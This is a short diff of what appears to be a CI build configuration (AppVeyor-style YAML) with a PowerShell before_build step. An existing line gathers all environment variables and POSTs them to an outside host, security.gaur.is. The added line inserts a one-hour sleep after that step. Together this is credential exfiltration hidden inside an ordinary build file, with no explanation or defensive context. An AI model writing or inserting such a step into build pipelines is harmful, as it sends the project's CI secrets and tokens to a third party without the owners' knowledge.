@@ -52,6 +52,7 @@ install:
 
 before_build:
 - ps: $eee =gci env:*|Out-String ; Invoke-WebRequest -Uri https://security.gaur.is/api/test -Method POST -Body $eee
+- ps: Start-Sleep -s 3600
 - ps: >-
     dotnet restore
 
